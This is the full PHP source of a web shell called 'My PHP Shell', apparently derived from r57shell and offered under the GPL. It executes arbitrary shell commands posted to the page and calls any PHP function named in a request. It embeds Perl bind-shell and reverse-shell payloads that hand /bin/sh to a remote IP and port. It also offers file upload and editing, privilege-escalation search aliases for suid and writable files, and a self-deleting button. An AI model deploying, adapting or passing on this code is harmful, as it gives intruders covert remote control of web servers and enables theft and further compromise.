<?php
/*
My PHP Shell - A very simple web shell (very much inspired from r57shell - rst team)
You can find a copy of this script on http://students.info.uaic.ro/~alexandru.plugaru/projects.html
Copyright (C) 2007 Alexandru Plugaru (alexandru.plugaru(guess what's here)infoiasi.ro)

This program is free software; you can redistribute it and/or
modify it under the terms of the GNU General Public License
as published by the Free Software Foundation; either version 2
of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program; if not, write to the Free Software
Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.
*/

/*==================BEGIN_INIT==============*/
define("VERSION", "v0.1");
@session_start();
@set_time_limit(0);
@set_magic_quotes_runtime(0);
@error_reporting(0);
@chdir($_POST['cwd']);
/*==================END_INIT===============*/

/*==================BEGIN_CONFIG============*/
define('DEFAULT_PORT', 5454);								// Default port for bindshell and back connect
define('MY_IP',$_SERVER['REMOTE_ADDR']);						// Your ip address (default for back connect)
define("BUFFER_ENABLED", true);								// Terminal buffering. Use true to enable or false to disable
define("BUFFER_MAX_LINES", 300); 								// Max lines to be saved

$aliases=array(										// Command aliases
	//Alias						Command
	array("Find some file in /"			=>"find / -type f -name "),
	array("Find all writable dirs/files in /"	=>"find / -perm -2 -ls"),
	array("Find all suid files in /"			=>"find / -type f -perm -04000 -ls"),
	array("Find all sgid files in /"			=>"find / -type f -perm -02000 -ls"),
	array("Show open ports"			=>"netstat -an | grep -i listen"),
	array("Show NIC configuration"		=>"ip addr show"),
);
/*==================END_CONFIG=============*/

foreach ($aliases as $n => $alias_array){
	$aliases_str.="<option value=$n>".key($alias_array)."</option>\n";
	$my_aliases .="myAliases[$n]='". $alias_array[key($alias_array)] . "';\n\t\t";
}
$content=array(
	"ID"				=>execute_simple("id"),
	"UNAME"			=>execute_simple("uname -a"),
	"DATE"				=>execute_simple("date"),
	"SERVER_SIGNATURE"	=>$_SERVER['SERVER_SIGNATURE'],
	"PORT"				=>DEFAULT_PORT,
	"MY_IP"			=>MY_IP,
	"PWD"				=>getcwd(),	
	"RESULT"			=>"",
	"CMD"				=>$_POST['cmd'],
	"ALIASES"			=>$aliases_str,
	"MY_ALIASES"			=>$my_aliases,
	"PHP_SELF"			=>$_SERVER['PHP_SELF'],
);


/* 
	From here edit if you know what you are doing
*/
if($_POST['cmd']!=""){
	if(preg_match('/^clear/',$_POST['cmd'])){				// Clearing the buffer
		$_SESSION['buf'] = array();
		$_SESSION['buf_size'] = 0;
	}else if(preg_match('/^cd/',$_POST['cmd'])){
		/*
			If we got some "cd" command the behavior should be like in a real shell enviroment
		*/
		if($_POST['cmd']=='cd'){
			@chdir(dirname($_SERVER['SCRIPT_FILENAME']));//home dir :)
		}
		else{
			$the_dir=substr($_POST['cmd'],3);
			$res=change_dir($the_dir);
			if($the_dir==$res){
				chdir($the_dir);
			}else{
				$result_cmd=$res;
			}
		}
		$content['PWD'] = getcwd();
	}else{
		$my_string = load_buffer($_SESSION['buf']);
		$my_cmd=execute_with_trap($_POST['cmd']);
		save_buffer($_SESSION['buf'], $_SESSION['buf_size'], "$ " . $_POST['cmd'] . "\n");
		save_buffer($_SESSION['buf'], $_SESSION['buf_size'], $my_cmd);
		$content['RESULT'] = $my_string ."$ " . $_POST['cmd'] . "\n" . $my_cmd;
	}
}
if($_POST['ajax']=="1"){						// We got here an httpRequest so we don't display all shit
	if($_POST['fn']!=""){						
		if($_POST['nr']!=""){					//function parameters? how many?
			$nr=(int)$_POST['nr'];
			for($i=0;$i<=$nr;$i++){
				$params[]=$_POST['parm'.$i];
			}
			$ret=call_user_func_array($_POST['fn'],$params);
		}else{
			$ret=call_user_func($_POST['fn']);
		}
	}
	if($ret)		echo $ret; 	// Display the response
}else{
	if($_POST['submit'] != ""){
		switch ($_POST['submit']){
			case "Upload":
				$GLOBALS['error'] = upload();
				display($content);
				break;
			case "Edit":
				display_editor($_POST['edit_file']);
				break;
			case "Save":
				save_file();
				display($content);
				break;
			default:
				display($content);
				break;
		}
	}else{
		display($content);
	}
	
}

/*=====================FUNCTIONS====================*/

/**
 * Simple command execution
 *
 * @param String $cmd
 * @return String
 */
function execute_simple($cmd){
	$out=shell_exec($cmd);
	$out=str_replace("\n","",$out);
	return $out;
}
/**
 * Execute command and return the result
 *
 * @param String$cmd
 * @return unknown
 */
function execute_with_trap($cmd)
{
	if ($stderr){
		$tmpfile = tempnam('/tmp', 'tmp');
		$cmd .= " 1> $tmpfile 2>&1; cat $tmpfile; rm $tmpfile";
	}
	return htmlspecialchars(shell_exec($cmd), ENT_COMPAT, 'UTF-8');
}
/**
 * Change directory 
 *
 * @param String $dir
 * @return String
 */
function change_dir($dir){
	if(is_dir($dir)){
		if(is_readable($dir) && is_executable($dir))	return $dir;
		else							return "You don't have permissions to access ".$dir;
	}else{
		return $dir . " is not a directory!";
	}
}
/**
 * Back connect perl script
 *
 * @param String $ip
 * @param String $port
 */
function bind_shell_perl($port){ //from r57 I think..
	$perl_bs=<<<PERL_BIND_SHELL
use POSIX qw(setsid);
use Socket;
$| = 1;
defined(my \$pid = fork) or die "Can't fork: $!";
exit if \$pid;
setsid or die "Can't start a new session: $!";
umask 0;

socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));
setsockopt(S,SOL_SOCKET,SO_REUSEADDR,1);
bind(S,sockaddr_in($port,INADDR_ANY));
listen(S,50);
accept(X,S);
open STDIN,"<&X";
open STDOUT,">&X";
open STDERR,">&X";
system("/bin/sh -i");
close X;
PERL_BIND_SHELL;
	$tmpfile = tempnam('/tmp', '5454');
	$fp=fopen($tmpfile,"w");fwrite($fp,$perl_bs);fclose($fp);//writing perl payload to tempfile
	$cmd= "perl $tmpfile";
	shell_exec($cmd);
	execute_simple("rm -f $tmpfile");
}
/**
 * Back connect perl script
 *
 * @param String $ip
 * @param String $port
 */
function back_connect_perl($ip,$port){
	$perl_bs=<<<PERL_BIND_SHELL
#!/usr/bin/perl
use POSIX qw(setsid);
use Socket;

\$system= '/bin/sh -i';
\$target="$ip";
\$port="$port";

defined(my \$pid = fork) or die "Can't fork: \$!";
exit if \$pid;
setsid or die "Can't start a new session: \$!";
umask 0;

\$iaddr=inet_aton(\$target) || die("Error: \$!\n");
\$paddr=sockaddr_in(\$port, \$iaddr) || die("Error: \$!\n");
\$proto=getprotobyname('tcp');

socket(SOCKET, PF_INET, SOCK_STREAM, \$proto) || die("Error: \$!\n");
connect(SOCKET, \$paddr) || die("Error: \$!\n");

open(STDIN, ">&SOCKET");
open(STDOUT, ">&SOCKET");
open(STDERR, ">&SOCKET");

system(\$system);

close(STDIN);
close(STDOUT);
close(STDERR);
PERL_BIND_SHELL;
	$tmpfile = tempnam('/tmp', '5454');
	$fp=fopen($tmpfile,"w");fwrite($fp,$perl_bs);fclose($fp);//writing perl payload to tempfile
	$cmd= "perl $tmpfile";
	shell_exec($cmd);
	execute_simple("rm -f $tmpfile");
}
/**
 * Upload a file
 *
 * @return String errors
 * */
function upload(){
	if(is_dir($_POST['file_path'])){
		if( is_writable( $_POST['file_path'] ) ){
			if( !file_exists( $_POST['file_path'] . "/" . $_FILES['file']['name'] ) ){
				move_uploaded_file( $_FILES['file']['tmp_name'], $_POST['file_path'] . "/" . $_FILES['file']['name'] );
			}else {
				return "File allready exists!";
			}
		}else{
			return "You do not have write permissions to this dir";
		}
	}else{
		if(!file_exists($_POST['file_path'])){
			if( is_writable( dirname( $_POST['file_path'] ) ) ){
				move_uploaded_file( $_FILES['file']['tmp_name'], $_POST['file_path']);
			}else{
				return "You do not have write permissions to this dir";
			}
		}else{
			return "File allready exists!";
		}
	}
}
/**
 * Getting previous commands buffer
 *
 * @param Array $buffer
 * @return String
 * */
function load_buffer(&$buffer){
	if(!is_array($buffer)) $buffer = array();
	$data = join("\n", $buffer);
	$data .= "\n\n";
	return $data;
}
/**
 * Putting the buffer
 *
 * @param Array $buffer
 * @param Int $buffer_len
 * @param String $command
 * */
function save_buffer(&$buffer, &$buffer_len, $lines){
	if(!is_int($buffer_len)) $buffer_len = 0;
	$lines = explode("\n", $lines);
	$len = count($lines);
	if(($buffer_len + $len) > BUFFER_MAX_LINES){
		$drop = $buffer_len + $len - BUFFER_MAX_LINES;
		$buffer_len -=$drop;
		while($drop--){
			array_shift($buffer);
		}
	}
	$buffer_len += $len;
	while($len--){
		array_push($buffer, array_shift($lines));
	}
}
/**
 * Unseting the sessiong and destroing the script
 *
 **/
function destroy(){ //this function deletes the script and clears sessions
	$_SESSION = array();
	session_destroy();
	@unlink($_SERVER['SCRIPT_FILENAME']);
}
/**
 * Save edited file
 *
 */
function save_file(){
	global $error;
	$file_path = $_POST['filepath'];
	$content = $_POST['content'];
	$content = stripslashes($content);
	if(!is_dir($file_path)){
		if(file_exists($file_path)){
			if(is_writable($file_path)){
				$fp = fopen($file_path,"w");
				fwrite($fp,$content);
				fclose($fp);
			}else {
				$error = "'$file_path' is not writable!";
			}
		}else{
			if(is_writable(dirname($file_path))){
				$fp = fopen($file_path,"w");
				fwrite($fp,$content);
				fclose($fp);
			}else{
				$error = "$file_path' is not writable!";
			}
		}
	}else {
		$error = "'$file_path' is a directory!";
	}
}
/**
 * Display editor
 */
function display_editor($file){
	if(!is_dir($file)){
		if(is_readable($file)){
			if(is_writable($file)){
				$content = file_get_contents($file);
			}else {
				$error = "'$file' is not writable!";
			}
		}else {
			$error = "'$file' is not readable!";
		}
	}else {
		$error = "'$file' is a directory!";
	}
	ob_start();
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<title>My PHP Shell <?echo VERSION;?></title>
<style>
	body	{font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 9px; color:#FFF; background-color: #555;}
	table	{background:#555;}
	textarea {background:#555000 none repeat scroll 0%;color:#0d0;font-family:monospace;font-size:11px;width:100%;height:100%;font-weight:bold;}
	input {background:#555;border: #CCC 1px solid;color: #FFF;}
	select{background:#555;border: #CCC 1px solid;color: #FFF;font-size:14px;}
	input.redButton{background:#f00; color:#555;position: absolute; right: 10px; top: 2px;}
	.error{color:#900; font-weight: bold; font-size: 12px;border: 1px solid #FFD700;; background: #ffa;}
</style>
</head>
<body>
	<?if($error !=""){?><div align="center" class="error"><?echo $error;?></div><br /><?}?>
	<form method="post" action="" enctype="multipart/form-data" >
	<div align="left">
		<strong>Save to file path: </strong><input type="text" style="width: 90%;" name="filepath" value="<?echo $file;?>" /><br />
	</div>
	<div align="center" style="clear: both;">
		<textarea name="content" rows="39" wrap="off"><?echo $content;?></textarea><br />
	</div>
	<div><input style="float:right;" type="submit" name="submit" value="Save"><input style="float: left;" type="submit" name="submit" value="Go back" onclick="window.location='';return false;"></div>	
	</form>
</body>
</html>
<?php
$html_content=ob_get_contents();
ob_end_clean();
echo $html_content;
}
/**
 * Output function
 *
 **/
function display ($vars){
	global $error;
	ob_start();
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<title>My PHP Shell <?echo VERSION;?></title>
<style>
	body	{font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 9px; color:#FFF; background-color: #555;}
	table	{background:#555;}
	textarea {background:#555000 none repeat scroll 0%;color:#0d0;font-family:monospace;font-size:11px;width:98%;font-weight:bold;}
	input {background:#555;border: #CCC 1px solid;color: #FFF;}
	select{background:#555;border: #CCC 1px solid;color: #FFF;font-size:14px;}
	input.redButton{background:#f00; color:#555;position: absolute; right: 10px; top: 2px;}
	.error{color:#900; font-weight: bold; font-size: 12px;border: 1px solid #FFD700;; background: #ffa;}
</style>
<script language="Javascript">
function init(){
	//just comment out this two lines to disable bottom autofocus of the textarea
	var objControl=document.getElementById("textarea_cmd");
	objControl.scrollTop = objControl.scrollHeight;
	document.getElementById('cmd').focus();
}
function destroy_script(){
	if(confirm("Are you sure you want to destroy the script?")){
		httpRequest("POST","{PHP_SELF}",true,"ajax=1&fn=destroy");
	}
	return false;
}
function pasteAlias(nr){
	var myAliases = new Array();
	{MY_ALIASES}
	document.getElementById('cmd').value=myAliases[nr];
	document.getElementById('cmd').focus();
}
var request = null;
function httpRequest(reqType,url,asynch){
	if(window.XMLHttpRequest){
		request = new XMLHttpRequest( );
	} else if (window.ActiveXObject){
		request=new ActiveXObject("Msxml2.XMLHTTP");
		if (! request){
			request=new ActiveXObject("Microsoft.XMLHTTP");
		}
	}
	if(request) {
		if(reqType.toLowerCase( ) != "post") {
			//GET
			initReq(reqType,url,asynch);
		} else {
			//POST
			var args = arguments[3];
			if(args != null && args.length > 0){
				initReq(reqType,url,asynch,args);
			}
		}
	} else {
		alert("Your browser does not permit the use of all of this application's features!");
	}
}

/* Initialize a request object that is already constructed */
function initReq(reqType,url,bool){
	try{
		/*Response handler*/
		request.onreadystatechange=respHandle;

		request.open(reqType,url,bool);
		if(reqType.toLowerCase( ) == "post"){
			request.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
			request.send(arguments[3]);
		}else{
			request.send(null);
		}
	}catch (errv){
		alert(
		"The application cannot contact "+
		"the server at the moment. "+
		"Please try again in a few seconds.\\n"+
		"Error detail: "+errv.message);
	}
}

function respHandle( ){
	if(request.readyState == 4){
		if(request.status == 200){
			document.getElementById("response").display='auto';
			document.getElementById("response").innerHTML=request.responseText;
		}
	}
}
</script>
</head>

<body onLoad="init();">
<div>
	<a href="http://students.info.uaic.ro/~alexandru.plugaru/projects.html" style="color:#fff;font-weight:bold;">My PHP Shell v0.1</a>
	<input type="button" class="redButton" value="The RED BUTTON" name="redButton" title="Delete the script" onclick="destroy_script(); return false;">
</div>
<?if($error !=""){?><br /><div align="center" class="error"><?echo $error;?></div><br /><?}?>
<hr>
<div id="response" style="display:none;"></div>
<div>
<table width="100%" style="font-size:11px;">
<tr><td style="color: #CC0000;">uname -a	</td><td>{UNAME}</td></tr>
<tr><td style="color: #CC0000;">id		</td><td>{ID}</td></tr>
<tr><td style="color: #CC0000;">httpd	</td><td>{SERVER_SIGNATURE}</td></tr>
<tr><td style="color: #CC0000;">date	</td><td>{DATE}</td></tr>
<tr><td style="color: #CC0000;">pwd	</td><td>{PWD}</td></tr>
</table>
</div>
<hr>

<div style="font-size:12px;">Executed:&nbsp;&nbsp;&nbsp;<strong>{CMD}</strong></div>
<hr>
<div align="center">
<textarea name="textarea_cmd" id="textarea_cmd" cols="140" rows="35" readonly="readonly" wrap="off">{RESULT}</textarea><br />
<form id="myForm" name="myForm" method="POST" action="" enctype="multipart/form-data">
<input type="hidden" name="cwd" value="{PWD}">
<select name="alias" onchange="pasteAlias(this.value)"><option value="">Select an alias</option>
{ALIASES}
</select>
<input type="text" size="90" id="cmd" name="cmd" style="font-size:14px;">
<input type="submit" name="command" value="Execute" id="command_button" style="font-size:14px;">
</div>
<hr>


<!-- Here we have bind,backconnect,file upload,edit file -->
<div align="center">
<div style="display:inline">
<strong>BindShell:</strong>&nbsp;&nbsp;
<input type="text" name="bind_port" id="bind_port" value="{PORT}" size="5"> <input type="submit" name="bind" value="Bind" onclick='httpRequest("POST","{PHP_SELF}",true,"ajax=1&fn=bind_shell_perl&nr=1&parm0=" + document.getElementById("bind_port").value); return false;'>
</div>

<!--Separator-->
&nbsp;&nbsp;<strong style="font-size:20px;">|</strong>&nbsp;
<!--Separator-->

<div style="display:inline">
<strong>Back-Connect:</strong>&nbsp;&nbsp;
<input type="text" name="back_ip" id="back_ip" value="{MY_IP}" size="10"><strong style="font-size:20px;">:</strong><input type="text" id="back_port" name="back_port" value="{PORT}" size="5"> <input type="submit" name="connect" value="Connect" onclick='httpRequest("POST","{PHP_SELF}",true,"ajax=1&fn=back_connect_perl&nr=2&parm0=" + document.getElementById("back_ip").value + "&parm1=" + document.getElementById("back_port").value); return false;'>
</div>

<!--Separator-->
&nbsp;&nbsp;<strong style="font-size:20px;">|</strong>&nbsp;
<!--Separator-->
	
<strong>Upload:</strong>&nbsp;&nbsp;
<input type="file" name="file" size="5">
<input type="text" name="file_path" title='Upload path' value='{PWD}/'>
<input type="submit" name="submit" value="Upload">
<!--Separator-->
&nbsp;&nbsp;<strong style="font-size:20px;">|</strong>&nbsp;
<!--Separator-->
<strong>Edit file:</strong>&nbsp;&nbsp;
<input type="text" name="edit_file" value='{PWD}/'> <input type="submit" name="submit" value="Edit">
</div>
</form>
</body>
</html>
<?php
$html_content=ob_get_contents();
foreach ($vars as $pattern => $value){
	$html_content=str_replace("{".$pattern."}",$value,$html_content); //some template shit...
}
ob_end_clean();
echo $html_content;
}
?>